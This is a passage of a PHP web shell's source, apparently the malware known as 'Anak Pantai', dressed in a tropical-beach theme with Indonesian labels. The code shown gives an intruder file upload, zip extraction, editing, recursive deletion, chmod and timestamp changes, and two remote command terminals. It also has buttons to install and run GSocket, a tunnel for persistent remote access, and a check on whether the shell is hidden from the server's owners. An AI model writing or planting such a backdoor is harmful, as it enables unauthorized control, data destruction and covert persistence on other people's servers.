if (class_exists('ZipArchive')) {
$zip = new ZipArchive();
if ($zip->open($zip_file) === TRUE) {
$zip->extractTo($__dir__);
$zip->close();
}
}
}
$redirect = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
header("Location: " . $redirect);
exit;
}
$_SESSION['cmd_output'] = $cmd_output;
$redirect = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
if (!headers_sent()) {
header("Location: " . $redirect);
exit;
} else {
echo '<script>window.location.href="' . $redirect . '";</script>';
exit;
}
}
if (isset($_GET['__del__'])) {
$target = $__dir__ . basename($_GET['__del__']);
if (@file_exists($target)) {
if (@is_dir($target)) {
$files = new RecursiveIteratorIterator(
new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS),
RecursiveIteratorIterator::CHILD_FIRST
);
foreach ($files as $fileinfo) {
$todo = ($fileinfo->isDir() ? 'rmdir' : 'unlink');
@$todo($fileinfo->getRealPath());
}
@rmdir($target);
} else {
@unlink($target);
}
$redirect = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
header("Location: " . $redirect);
exit;
}
}
if (isset($_GET['__extract__'])) {
$target = $__dir__ . basename($_GET['__extract__']);
if (@file_exists($target) && pathinfo($target, PATHINFO_EXTENSION) === 'zip') {
if (class_exists('ZipArchive')) {
$zip = new ZipArchive();
if ($zip->open($target) === TRUE) {
$zip->extractTo($__dir__);
$zip->close();
}
}
$redirect = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
header("Location: " . $redirect);
exit;
}
}
// Handle logout
if (isset($_GET['logout'])) {
session_destroy();
echo '<script>window.location.href="?";</script>';
exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🏝️ Anak Pantai</title>
<link href="https://fonts.googleapis.com/css2?family=Pacifico&family=Quicksand:wght@300;400;600;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
<style>
:root {
--sand: #f9e9d2;
--sand-dark: #eed9b5;
--ocean-light: #7ed4e8;
--ocean: #4aa3c2;
--ocean-dark: #2c7a9e;
--coral: #ff8a7a;
--coral-dark: #ff6b5e;
--palm: #2e7d5e;
--palm-light: #3c9b77;
--sun: #ffd966;
--sunset: #ffb347;
--white: #ffffff;
--text-dark: #2c3e50;
--text-light: #ecf0f1;
}
* {
margin: 0;
padding: 0;
box-sizing: border-box;
}
body {
font-family: 'Quicksand', sans-serif;
background: linear-gradient(145deg, #b5e1f5 0%, #f9e9d2 100%);
color: var(--text-dark);
min-height: 100vh;
position: relative;
overflow-x: hidden;
}
.beach-bg {
position: fixed;
top: 0;
left: 0;
width: 100%;
height: 100%;
background:
radial-gradient(circle at 20% 30%, rgba(71, 65, 65, 0.7) 0%, transparent 30%),
radial-gradient(circle at 80% 70%, rgba(255, 215, 0, 0.2) 0%, transparent 40%),
linear-gradient(145deg, rgba(126, 212, 232, 0.6) 0%, rgba(249, 233, 210, 0.8) 100%);
z-index: -3;
pointer-events: none;
}
.beach-bg::before {
content: "";
position: fixed;
top: 50%;
left: 50%;
transform: translate(-50%, -50%);
width: 1000px;
height: 1000px;
background-image: url('https://i.ibb.co/nv3B26W/image.png');
background-size: contain;
background-repeat: no-repeat;
background-position: center;
opacity: 0.5;
pointer-events: none;
z-index: -2;
}
.ocean-waves {
position: fixed;
bottom: 0;
left: 0;
width: 100%;
height: 120px;
background: repeating-linear-gradient(
transparent 0px,
transparent 20px,
rgba(126, 212, 232, 0.2) 20px,
rgba(126, 212, 232, 0.2) 40px
);
animation: waveMove 10s linear infinite;
z-index: -2;
pointer-events: none;
}
@keyframes waveMove {
0% { background-position: 0 0; }
100% { background-position: 100px 0; }
}
.palm-leaf {
position: fixed;
width: 200px;
height: 200px;
background: radial-gradient(circle at 30% 30%, var(--palm-light) 0%, var(--palm) 100%);
clip-path: polygon(20% 0%, 80% 0%, 100% 100%, 0% 100%);
opacity: 0.3;
z-index: -1;
pointer-events: none;
}
.palm-1 {
bottom: 0;
left: 0;
transform: rotate(10deg);
}
.palm-2 {
top: 0;
right: 0;
transform: rotate(200deg);
}
.tropical-container {
max-width: 1600px;
margin: 0 auto;
padding: 30px 20px;
position: relative;
z-index: 1;
}
.tropical-header {
background: rgba(248, 193, 193, 0.14);
backdrop-filter: blur(15px);
border-radius: 40px;
padding: 30px;
margin-bottom: 30px;
box-shadow:
0 20px 50px rgba(44, 122, 158, 0.2),
0 5px 15px rgba(0, 0, 0, 0.1),
inset 0 2px 10px rgba(255, 255, 255, 0.5);
border: 1px solid rgba(255, 255, 255, 0.4);
position: relative;
overflow: hidden;
}
.tropical-header::after {
content: "ℒ𝓮𝓮🏖️";
position: absolute;
top: -10px;
right: 20px;
font-size: 100px;
opacity: 0.1;
transform: rotate(10deg);
}
.tropical-header h1 {
font-family: 'Pacifico', cursive;
font-size: 4rem;
font-weight: 400;
margin-bottom: 20px;
background: linear-gradient(135deg, var(--ocean-dark), var(--coral-dark), var(--sunset));
-webkit-background-clip: text;
-webkit-text-fill-color: transparent;
background-clip: text;
text-shadow: 3px 3px 10px rgba(255, 255, 255, 0.5);
letter-spacing: 2px;
}
.path-nav {
background: rgba(255, 255, 255, 0.4);
backdrop-filter: blur(10px);
padding: 20px 25px;
border-radius: 30px;
margin-bottom: 20px;
font-family: 'Courier New', monospace;
font-size: 16px;
word-break: break-all;
border: 1px solid rgba(255, 255, 255, 0.6);
box-shadow: 0 5px 15px rgba(44, 122, 158, 0.1);
}
.path-nav a {
color: var(--ocean-dark);
text-decoration: none;
transition: all 0.3s;
padding: 5px 10px;
border-radius: 20px;
font-weight: 600;
}
.path-nav a:hover {
color: var(--coral);
background: rgba(255, 255, 255, 0.5);
box-shadow: 0 2px 8px rgba(255, 138, 122, 0.3);
}
.status-badge {
display: inline-block;
padding: 15px 30px;
border-radius: 40px;
font-size: 16px;
font-weight: 600;
margin-bottom: 20px;
background: rgba(255, 255, 255, 0.3);
backdrop-filter: blur(10px);
color: var(--text-dark);
border: 1px solid rgba(255, 255, 255, 0.5);
box-shadow: 0 4px 15px rgba(44, 122, 158, 0.2);
letter-spacing: 1px;
}
.action-buttons {
display: flex;
flex-wrap: wrap;
gap: 15px;
margin-top: 25px;
}
.tropical-btn {
padding: 14px 28px;
border-radius: 40px;
border: none;
font-weight: 600;
cursor: pointer;
transition: all 0.3s ease;
text-decoration: none;
display: inline-flex;
align-items: center;
gap: 10px;
font-family: 'Quicksand', sans-serif;
font-size: 15px;
backdrop-filter: blur(5px);
box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
border: 1px solid rgba(255, 255, 255, 0.3);
}
.tropical-btn:hover {
transform: translateY(-3px);
box-shadow: 0 8px 20px rgba(44, 122, 158, 0.3);
}
.btn-ocean {
background: linear-gradient(145deg, var(--ocean-light), var(--ocean-dark));
color: white;
}
.btn-sand {
background: rgba(249, 233, 210, 0.7);
color: var(--text-dark);
border: 1px solid rgba(255, 255, 255, 0.5);
}
.btn-coral {
background: linear-gradient(145deg, var(--coral), var(--coral-dark));
color: white;
}
.btn-palm {
background: linear-gradient(145deg, var(--palm-light), var(--palm));
color: white;
}
.btn-sun {
background: linear-gradient(145deg, var(--sun), var(--sunset));
color: var(--text-dark);
}
.messages {
margin-bottom: 30px;
}
.upload-grid {
display: grid;
grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
gap: 25px;
margin-bottom: 40px;
}
.tropical-card {
background: rgba(255, 255, 255, 0.3);
backdrop-filter: blur(15px);
border: 1px solid rgba(255, 255, 255, 0.4);
border-radius: 30px;
padding: 30px;
box-shadow:
0 20px 40px rgba(44, 122, 158, 0.1),
inset 0 2px 10px rgba(255, 255, 255, 0.5);
transition: all 0.3s ease;
}
.tropical-card:hover {
transform: translateY(-5px);
box-shadow:
0 25px 50px rgba(44, 122, 158, 0.15),
inset 0 2px 15px rgba(255, 255, 255, 0.6);
}
.tropical-card h3 {
color: var(--ocean-dark);
margin-bottom: 25px;
display: flex;
align-items: center;
gap: 15px;
font-size: 1.5rem;
font-weight: 700;
border-bottom: 2px solid rgba(255, 255, 255, 0.4);
padding-bottom: 15px;
}
.tropical-input {
width: 100%;
padding: 16px 20px;
background: rgba(255, 255, 255, 0.5);
border: 1px solid rgba(255, 255, 255, 0.6);
border-radius: 50px;
color: var(--text-dark);
font-size: 15px;
margin-bottom: 20px;
font-family: 'Quicksand', sans-serif;
transition: all 0.3s;
backdrop-filter: blur(5px);
}
.tropical-input:focus {
outline: none;
border-color: var(--ocean);
box-shadow: 0 0 0 3px rgba(74, 163, 194, 0.2);
background: rgba(255, 255, 255, 0.7);
}
.tropical-table {
width: 100%;
background: rgba(255, 255, 255, 0.3);
backdrop-filter: blur(15px);
border-radius: 30px;
overflow: hidden;
margin-bottom: 40px;
border: 1px solid rgba(255, 255, 255, 0.4);
box-shadow: 0 20px 40px rgba(44, 122, 158, 0.1);
}
.tropical-table th {
background: rgba(255, 255, 255, 0.2);
padding: 20px;
text-align: left;
font-weight: 700;
color: var(--ocean-dark);
border-bottom: 2px solid rgba(255, 255, 255, 0.4);
font-size: 1.1rem;
}
.tropical-table td {
padding: 18px 20px;
border-bottom: 1px solid rgba(255, 255, 255, 0.2);
transition: all 0.3s;
}
.tropical-table tr:hover {
background: rgba(255, 255, 255, 0.1);
}
.tropical-name {
cursor: pointer;
color: var(--ocean-dark);
text-decoration: none;
font-weight: 600;
padding: 8px 15px;
border-radius: 30px;
transition: all 0.3s;
display: inline-flex;
align-items: center;
gap: 10px;
}
.tropical-name:hover {
background: rgba(255, 255, 255, 0.4);
transform: translateX(5px);
box-shadow: 0 4px 12px rgba(44, 122, 158, 0.2);
}
.folder-name {
color: var(--palm);
}
.file-name {
color: var(--ocean-dark);
}
.action-icon {
padding: 8px 16px;
border-radius: 30px;
font-size: 13px;
margin: 3px;
display: inline-block;
text-decoration: none;
font-family: 'Quicksand', sans-serif;
font-weight: 600;
transition: all 0.3s;
border: 1px solid transparent;
background: rgba(255, 255, 255, 0.3);
color: var(--text-dark);
}
.action-icon:hover {
transform: translateY(-2px);
box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
background: rgba(255, 255, 255, 0.5);
}
.tropical-terminal {
background: rgba(255, 255, 255, 0.3);
backdrop-filter: blur(15px);
border: 1px solid rgba(255, 255, 255, 0.4);
border-radius: 30px;
padding: 30px;
margin-top: 40px;
margin-bottom: 40px;
box-shadow:
0 20px 40px rgba(44, 122, 158, 0.1),
inset 0 2px 10px rgba(255, 255, 255, 0.5);
}
.terminal-output {
background: rgba(0, 0, 0, 0.2);
backdrop-filter: blur(5px);
color: white;
padding: 25px;
border-radius: 20px;
font-family: 'Courier New', monospace;
font-size: 14px;
white-space: pre-wrap;
max-height: 500px;
overflow-y: auto;
margin-top: 20px;
line-height: 1.6;
border: 1px solid rgba(255, 255, 255, 0.2);
}
.command-status {
display: inline-block;
padding: 8px 20px;
border-radius: 40px;
font-size: 14px;
font-weight: bold;
margin-bottom: 10px;
letter-spacing: 1px;
}
.status-success {
background: rgba(46, 125, 94, 0.2);
color: var(--palm);
border: 1px solid rgba(46, 125, 94, 0.3);
}
.status-error {
background: rgba(255, 107, 94, 0.2);
color: var(--coral-dark);
border: 1px solid rgba(255, 107, 94, 0.3);
}
.tropical-editor {
background: rgba(255, 255, 255, 0.3);
backdrop-filter: blur(15px);
border: 1px solid rgba(255, 255, 255, 0.4);
border-radius: 30px;
padding: 30px;
margin-bottom: 40px;
}
.tropical-editor textarea {
width: 100%;
height: 400px;
background: rgba(0, 0, 0, 0.2);
color: white;
font-family: 'Courier New', monospace;
font-size: 15px;
border: 1px solid rgba(255, 255, 255, 0.3);
border-radius: 20px;
padding: 20px;
resize: vertical;
}
.tropical-modal {
display: none;
position: fixed;
top: 0;
left: 0;
width: 100%;
height: 100%;
background: rgba(0, 0, 0, 0.3);
backdrop-filter: blur(8px);
z-index: 1000;
align-items: center;
justify-content: center;
}
.modal-content {
background: rgba(255, 255, 255, 0.95);
backdrop-filter: blur(20px);
border: 1px solid rgba(255, 255, 255, 0.6);
border-radius: 50px;
padding: 40px;
max-width: 500px;
width: 90%;
box-shadow:
0 40px 80px rgba(44, 122, 158, 0.3),
0 10px 30px rgba(0, 0, 0, 0.2);
animation: modalAppear 0.4s ease-out;
}
.perm-badge {
display: inline-block;
padding: 6px 12px;
border-radius: 20px;
font-family: 'Courier New', monospace;
font-size: 13px;
font-weight: 600;
cursor: help;
transition: all 0.2s;
}
.perm-writable {
background: rgba(46, 125, 94, 0.2);
color: #2e7d5e;
border: 1px solid rgba(46, 125, 94, 0.3);
}
.perm-readonly {
background: rgba(255, 107, 94, 0.2);
color: #ff6b5e;
border: 1px solid rgba(255, 107, 94, 0.3);
}
.perm-badge:hover {
transform: scale(1.05);
filter: brightness(1.2);
}
@keyframes modalAppear {
from { transform: scale(0.9) translateY(20px); opacity: 0; }
to { transform: scale(1) translateY(0); opacity: 1; }
}
input[type="checkbox"] {
width: 20px;
height: 20px;
accent-color: var(--coral);
cursor: pointer;
}
::-webkit-scrollbar {
width: 12px;
}
::-webkit-scrollbar-track {
background: rgba(255, 255, 255, 0.1);
border-radius: 6px;
}
::-webkit-scrollbar-thumb {
background: linear-gradient(145deg, var(--ocean-light), var(--ocean-dark));
border-radius: 6px;
border: 2px solid rgba(255, 255, 255, 0.3);
}
::-webkit-scrollbar-thumb:hover {
background: linear-gradient(145deg, var(--coral), var(--coral-dark));
}
@media (max-width: 768px) {
.tropical-container { padding: 15px; }
.upload-grid { grid-template-columns: 1fr; }
.action-buttons { flex-direction: column; }
.tropical-btn { width: 100%; }
.tropical-header h1 { font-size: 2.5rem; }
.modal-content { padding: 25px; }
}
#magic-terminal-btn:hover {
transform: scale(1.15) rotate(5deg);
filter: drop-shadow(0 0 30px rgba(255,70,70,1));
border-color: #ff4646 !important;
}
#magic-terminal-output pre {
background: rgba(0,0,0,0.8);
color: #00ff00;
padding: 15px;
border-radius: 10px;
font-family: monospace;
font-size: 13px;
max-height: 300px;
overflow-y: auto;
border: 1px solid #ff4646;
margin-top: 10px;
}
.quick-cmd:hover {
background: #ff4646 !important;
color: white !important;
}
</style>
</head>
<body>
<div class="beach-bg"></div>
<div class="ocean-waves"></div>
<div class="palm-leaf palm-1"></div>
<div class="palm-leaf palm-2"></div>
<div class="tropical-container">
<div class="tropical-header">
<h1>🏝️ Pantai</h1>
<div class="path-nav">
<?php
$parts = explode('/', trim($__dir__, '/'));
$current = '';
echo '<a href="?__d__=/">☯Root☯</a>';
foreach ($parts as $part) {
if ($part) {
$current .= '/' . $part;
echo '/<a href="?__d__=' . urlencode($current) . '">' . htmlspecialchars($part) . '</a>';
}
}
?>
</div>
<div class="status-badge">
<span>🏖️ Status:</span>
<span style="margin-left: 15px;">🔧 Perm: <?php echo substr(sprintf('%o', @fileperms($__dir__)), -4); ?></span>
<span style="margin-left: 15px;">💾 Free: <?php echo round(disk_free_space($__dir__)/1024/1024/1024, 2); ?>GB</span>
<span style="margin-left: 15px;">🔒 Status: <?php echo isSelfHidden(__FILE__) ? 'Tersembunyi' : 'Bisa'; ?></span>
</div>
<?php if (!empty($messages)): ?>
<div style="margin: 20px 0;">
<?php foreach ($messages as $msg): ?>
<?php
$is_success = strpos($msg, '✅') !== false;
$bg_color = $is_success ? 'rgba(46, 125, 94, 0.2)' : 'rgba(255, 107, 94, 0.2)';
$border_color = $is_success ? '#2e7d5e' : '#ff6b5e';
?>
<div style="background: <?php echo $bg_color; ?>;
border-left: 5px solid <?php echo $border_color; ?>;
padding: 15px 20px;
margin-bottom: 10px;
border-radius: 15px;
backdrop-filter: blur(5px);
white-space: pre-line;">
<?php echo htmlspecialchars($msg); ?>
</div>
<?php endforeach; ?>
</div>
<?php endif; ?>
<div class="action-buttons">
<a href="?__d__=<?php echo urlencode($_SESSION['initial_dir']); ?>" class="tropical-btn btn-ocean">🏝️ Home</a>
<a href="?__d__=<?php echo urlencode(dirname($__dir__)); ?>" class="tropical-btn btn-sand"> ↩ kembali 1 path</a>
<a href="?__d__=<?php echo urlencode($__dir__); ?>" class="tropical-btn btn-sand">🔄 Refresh</a>
<button class="tropical-btn btn-palm" onclick="showCreateModal()">➕ Create</button>
<button class="tropical-btn btn-coral" onclick="showDeleteModal()">🗑 Delete</button>
<a href="?logout=1" class="tropical-btn btn-coral">🚪 Logout</a>
</div>
</div>
<div style="text-align: center; margin: 30px 0 20px 0;">
<img src="https://i.ibb.co/nv3B26W/image.png"
id="magic-terminal-btn"
style="width: 70px; height: 70px; cursor: pointer; filter: drop-shadow(0 0 20px rgba(255,70,70,0.8));
transition: all 0.4s; border-radius: 50%; border: 2px solid transparent;"
title="⚡ Klik untuk membuka Terminal Ajaib ⚡"
onclick="toggleMagicTerminal()">
<div style="color: #ff4646; font-size: 14px; margin-top: 8px; font-weight: bold;">
⚡ TERMINAL AJAIB ⚡
</div>
</div>
<!-- Container Terminal (Awalnya Tersembunyi) -->
<div id="magic-terminal" style="display: none; margin-bottom: 40px;">
<div class="tropical-card" style="background: linear-gradient(145deg, #0a0b0e, #1a1b1f); border: 2px solid #ff4646;">
<!-- Header Terminal -->
<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
<div style="display: flex; align-items: center; gap: 10px;">
<img src="https://i.ibb.co/nv3B26W/image.png" style="width: 30px; height: 30px;">
<h3 style="color: #ff4646; margin: 0;">⚡ TERMINAL AJAIB</h3>
</div>
<span style="color: #ff4646; cursor: pointer; font-size: 24px;" onclick="toggleMagicTerminal()">✖</span>
</div>
<!-- Info Path Saat Ini -->
<div style="background: rgba(255,70,70,0.1); padding: 10px 15px; border-radius: 30px; margin-bottom: 15px;">
<span style="color: #ff4646;">📁 PATH: </span>
<span style="color: #fff; font-family: monospace;"><?php echo htmlspecialchars($__dir__); ?></span>
</div>
<!-- Form Terminal -->
<form method="post" id="magic-terminal-form" style="margin-bottom: 15px;">
<input type="hidden" name="__magic_path__" value="<?php echo htmlspecialchars($__dir__); ?>">
<div style="display: flex; gap: 10px;">
<span style="color: #ff4646; font-family: monospace; font-size: 18px;">$</span>
<input type="text" name="__magic_cmd__"
placeholder="Contoh: wget https://file.com/file.zip | ls -la | php -v"
style="flex: 1; background: rgba(0,0,0,0.3); border: 1px solid #ff4646;
color: #00ff00; padding: 10px 15px; border-radius: 30px;
font-family: monospace;"
id="magic-cmd-input">
<button type="submit"
style="background: #ff4646; color: white; border: none;
padding: 10px 25px; border-radius: 30px; cursor: pointer;
font-weight: bold;">⚡ RUN</button>
</div>
</form>
<!-- ===== GSOCKET SECTION ===== -->
<div style="margin: 25px 0; padding: 15px; background: rgba(0,0,0,0.2); border: 1px solid #ff4646; border-radius: 15px;">
<div style="display: flex; gap: 10px; margin-bottom: 15px; flex-wrap: wrap; justify-content: center;">
<!-- Install -->
<form method="post" style="display: inline-block;">
<input type="hidden" name="gsocket_action" value="install">
<button type="submit"
style="background: #1f4f4f; color: #9fefef; border: 1px solid #3fcfaf;
padding: 8px 16px; border-radius: 25px; font-size: 12px;
font-weight: bold; cursor: pointer; display: inline-flex; align-items: center; gap: 5px;">
<i class="fas fa-download"></i> INSTALL
</button>
</form>
<!-- Run -->
<form method="post" style="display: inline-block;">
<input type="hidden" name="gsocket_action" value="run">
<button type="submit"
style="background: #2f4f2f; color: #9fef9f; border: 1px solid #5fcf5f;
padding: 8px 16px; border-radius: 25px; font-size: 12px;
font-weight: bold; cursor: pointer; display: inline-flex; align-items: center; gap: 5px;">
<i class="fas fa-play"></i> RUN
</button>
</form>
<!-- Kill -->
<form method="post" style="display: inline-block;">
<input type="hidden" name="gsocket_action" value="kill">
<button type="submit"
style="background: #4f2f4f; color: #ff9fff; border: 1px solid #cf5fcf;
padding: 8px 16px; border-radius: 25px; font-size: 12px;
font-weight: bold; cursor: pointer; display: inline-flex; align-items: center; gap: 5px;">
<i class="fas fa-skull"></i> KILL
</button>
</form>
<!-- Uninstall -->
<form method="post" style="display: inline-block;" onsubmit="return confirm('Uninstall GSocket?')">
<input type="hidden" name="gsocket_action" value="uninstall">
<button type="submit"
style="background: #4f2a2a; color: #ff9f9f; border: 1px solid #ff5f5f;
padding: 8px 16px; border-radius: 25px; font-size: 12px;
font-weight: bold; cursor: pointer; display: inline-flex; align-items: center; gap: 5px;">
<i class="fas fa-trash"></i> UNINSTALL
</button>
</form>
</div>
<div style="text-align: center; color: #ffa500; font-size: 11px;">
<i class="fas fa-info-circle"></i> Klik INSTALL dulu, lalu RUN untuk dapat SECRET
</div>
</div>
<!-- Tempat Hasil Output -->
<div id="magic-terminal-output"></div>
<!-- Tombol Cepat -->
<div style="margin-top: 15px; display: flex; gap: 5px; flex-wrap: wrap;">
<span style="color: #ff4646;">🔥:</span>
<button type="button" onclick="setCommand('ls -la')" style="background: none; border: 1px solid #ff4646; color: #ff4646; padding: 5px 12px; border-radius: 20px; cursor: pointer;">ls -la</button>
<button type="button" onclick="setCommand('pwd')" style="background: none; border: 1px solid #ff4646; color: #ff4646; padding: 5px 12px; border-radius: 20px; cursor: pointer;">pwd</button>
<button type="button" onclick="setCommand('php -v')" style="background: none; border: 1px solid #ff4646; color: #ff4646; padding: 5px 12px; border-radius: 20px; cursor: pointer;">php -v</button>
</div>
</div>
</div>
<div class="upload-grid">
<div class="tropical-card">
<h3>📩 Upload All File</h3>
<form method="post" enctype="multipart/form-data">
<input type="file" name="files[]" class="tropical-input" multiple required>
<button type="submit" class="tropical-btn btn-ocean" style="width: 100%;">🗽Upload</button>
</form>
</div>
<div class="tropical-card">
<h3>📚 Upload dan Extrax</h3>
<form method="post" enctype="multipart/form-data">
<input type="file" name="zip_file" class="tropical-input" accept=".zip" required>
<button type="submit" class="tropical-btn btn-palm" style="width: 100%;">🐣 Upload & Extract</button>
</form>
</div>
<div class="tropical-card">
<h3>📠Terminal</h3>
<form method="post">
<input type="text" name="__cmd__" class="tropical-input"
placeholder="ls, pwd, wget, curl, zip, etc."
value="" autocomplete="off">
<button type="submit" class="tropical-btn btn-ocean" style="width: 100%;">⚡ Execute</button>
</form>
</div>
</div>
<div class="file-table-container">
<table class="tropical-table">
<thead>
<tr>
<th><input type="checkbox" id="selectAll"></th>
<th>Nama</th>
<th>Ukuran</th>
<th>Permissions</th>
<th>Waktu</th>
<th>Actions</th>
</tr>
</thead>
<tbody id="fileTableBody">
<?php
$items = @scandir($__dir__);
if ($items) {
$folders = $files = [];
foreach ($items as $item) {
if ($item == '.' || $item == '..') continue;
$path = $__dir__ . $item;
if (@is_dir($path)) $folders[] = $item;
else $files[] = $item;
}
sort($folders);
sort($files);
foreach ($folders as $item) {
$path = $__dir__ . $item;
$perm_info = formatPermissions($path);
$modified = date('Y-m-d H:i', @filemtime($path));
?>
<tr>
<td><input type="checkbox" name="selected_items[]" value="<?php echo $item; ?>" class="file-checkbox"></td>
<td>
<a href="?__d__=<?php echo urlencode($path); ?>" class="tropical-name folder-name">
<strong>📁 <?php echo htmlspecialchars($item); ?></strong>
</a>
</td>
<td>-</td>
<td>
<span class="perm-badge <?php echo $perm_info['writable'] ? 'perm-writable' : 'perm-readonly'; ?>"
title="Unix: <?php echo $perm_info['unix']; ?>
Octal: <?php echo $perm_info['octal']; ?>
PHP <?php echo $perm_info['writable'] ? 'can write' : 'read-only'; ?>">
<?php echo $perm_info['unix']; ?> (<?php echo $perm_info['octal']; ?>)
</span>
</td>
<td><?php echo $modified; ?></td>
<td>
<a href="#" onclick="showRenameModal('<?php echo addslashes($item); ?>')" class="action-icon">✏️ Rename</a>
<a href="#" onclick="showTouchModal('<?php echo addslashes($item); ?>')" class="action-icon">📅 Time</a>
<a href="#" onclick="showChmodModal('<?php echo addslashes($item); ?>', '<?php echo $perm_info['octal']; ?>')" class="action-icon">🔧 Chmod</a>
<a href="?__d__=<?php echo urlencode($__dir__); ?>&__del__=<?php echo urlencode($item); ?>"
class="action-icon" style="background: rgba(255,107,94,0.3);" onclick="return confirm('Delete <?php echo addslashes($item); ?>?')">🗑 Delete</a>
</td>
</tr>
<?php
}
foreach ($files as $item) {
$path = $__dir__ . $item;
$size = @filesize($path);
$perm_info = formatPermissions($path);
$modified = date('Y-m-d H:i', @filemtime($path));
$ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
$editable = true;
?>
<tr>
<td><input type="checkbox" name="selected_items[]" value="<?php echo $item; ?>" class="file-checkbox"></td>
<td>
<?php if ($editable): ?>
<a href="?__d__=<?php echo urlencode($__dir__); ?>&__edit__=<?php echo urlencode($item); ?>" class="tropical-name file-name">
📄 <?php echo htmlspecialchars($item); ?>
</a>
<?php else: ?>
<span class="tropical-name file-name">📄 <?php echo htmlspecialchars($item); ?></span>
<?php endif; ?>
</td>
<td><?php echo formatBytes($size); ?></td>
<td>
<span class="perm-badge <?php echo $perm_info['writable'] ? 'perm-writable' : 'perm-readonly'; ?>"
title="Unix: <?php echo $perm_info['unix']; ?>
Octal: <?php echo $perm_info['octal']; ?>
PHP <?php echo $perm_info['writable'] ? 'can write' : 'read-only'; ?>">
<?php echo $perm_info['unix']; ?> (<?php echo $perm_info['octal']; ?>)
</span>
</td>
<td><?php echo $modified; ?></td>
<td>
<?php if ($editable): ?>
<a href="#" onclick="openDirectLink('<?php echo urlencode($item); ?>')" class="action-icon" style="background: rgba(255,215,0,0.3);">🔗 Direct</a>
<a href="?__d__=<?php echo urlencode($__dir__); ?>&__edit__=<?php echo urlencode($item); ?>" class="action-icon" style="background: rgba(74,163,194,0.3);">✏️ Edit</a>
<?php endif; ?>
<?php if ($ext == 'zip'): ?>
<a href="?__d__=<?php echo urlencode($__dir__); ?>&__extract__=<?php echo urlencode($item); ?>"
class="action-icon" style="background: rgba(46,125,94,0.3);" onclick="return confirm('Extract this archive?')">📦 Extract</a>
<?php endif; ?>
<a href="#" onclick="showRenameModal('<?php echo addslashes($item); ?>')" class="action-icon">✏️ Rename</a>
<a href="#" onclick="showTouchModal('<?php echo addslashes($item); ?>')" class="action-icon">📅 Time</a>
<a href="#" onclick="showChmodModal('<?php echo addslashes($item); ?>', '<?php echo $perm_info['octal']; ?>')" class="action-icon">🔧 Chmod</a>
<a href="?__d__=<?php echo urlencode($__dir__); ?>&__del__=<?php echo urlencode($item); ?>"
class="action-icon" style="background: rgba(255,107,94,0.3);" onclick="return confirm('Delete <?php echo addslashes($item); ?>?')">🗑 Delete</a>
</td>
</tr>
<?php
}
}
?>
</tbody>
</table>
</div>
<?php if (isset($editing_file)): ?>
<div class="tropical-editor">
<h3 style="color: var(--ocean-dark); margin-bottom: 20px;">✏️ Editing: <?php echo htmlspecialchars($editing_file); ?></h3>
<form method="post">
<textarea name="__content__" spellcheck="false"><?php echo htmlspecialchars($file_content); ?></textarea>
<input type="hidden" name="__edit_file__" value="<?php echo htmlspecialchars($editing_file); ?>">
<div style="margin-top: 25px; display: flex; gap: 15px;">
<button type="submit" class="tropical-btn btn-palm">💾 Save</button>
<a href="?__d__=<?php echo urlencode($__dir__); ?>" class="tropical-btn btn-sand">Cancel</a>
</div>
</form>
</div>
<?php endif; ?>
<?php if (!empty($cmd_output) && trim($cmd_output) !== ''): ?>
<div class="tropical-terminal">
<h3 style="color: var(--ocean-dark); margin-bottom: 20px;">📟 Terminal Output</h3>
<?php
$is_success = strpos($cmd_output, '✅ Success:') === 0;
?>
<div class="command-status <?php echo $is_success ? 'status-success' : 'status-error'; ?>">
<?php echo $is_success ? '✓ COMMAND SUCCESSFUL' : '✗ COMMAND FAILED'; ?>
</div>
<div class="terminal-output">
<?php
$lines = explode("\n", $cmd_output);
foreach ($lines as $i => $line) {
$line = htmlspecialchars($line);
if ($i === 0) {
echo '<div style="color: ' . ($is_success ? '#2e7d5e' : '#ff6b5e') . '; font-weight: bold; margin-bottom: 10px;">' . $line . '</div>';
} elseif (preg_match('/^\s*\[STDERR\]:/i', $line)) {
echo '<div style="color: #ff6b5e;">' . $line . '</div>';
} elseif (preg_match('/^\s*\d+\.\d+%|\s*\d+%|\s*\d+\/\d+/', $line)) {
echo '<div style="color: #4aa3c2;">' . $line . '</div>';
} elseif (preg_match('/^\s*(http|https|ftp):\/\//i', $line)) {
echo '<div style="color: #ffb347;">' . $line . '</div>';
} else {
echo '<div>' . $line . '</div>';
}
}
?>
</div>
</div>
<?php endif; ?>
</div>
<!-- Create Modal -->
<div class="tropical-modal" id="createModal">
<div class="modal-content">
<h3 style="color: var(--ocean-dark); margin-bottom: 20px;">➕ Create New</h3>
<form method="post">
<input type="text" name="__name__" class="tropical-input" placeholder="Name" required>
<select name="__type__" class="tropical-input">
<option value="file">📄 File</option>
<option value="folder">📁 Folder</option>
</select>
<textarea name="__data__" class="tropical-input" placeholder="Content (for files)" rows="4"></textarea>
<input type="hidden" name="__create__" value="1">
<div style="display: flex; gap: 15px; margin-top: 25px;">
<button type="submit" class="tropical-btn btn-palm" style="flex: 2;">Create</button>
<button type="button" class="tropical-btn btn-sand" style="flex: 1;" onclick="hideModal('createModal')">Cancel</button>
</div>
</form>
</div>
</div>
<!-- Chmod Modal -->
<div class="tropical-modal" id="chmodModal">
<div class="modal-content">
<h3 style="color: var(--ocean-dark); margin-bottom: 20px;">🔧 Change Permissions</h3>
<form method="post">
<input type="hidden" name="__chmod_file__" id="chmodFileName">
<input type="text" name="__permissions__" id="chmodValue" class="tropical-input" placeholder="e.g., 0755" pattern="[0-7]{4}" required>
<small style="color: #666;">Common: 0755 (rwxr-xr-x), 0644 (rw-r--r--), 0777 (rwxrwxrwx)</small>
<div style="display: flex; gap: 15px; margin-top: 25px;">
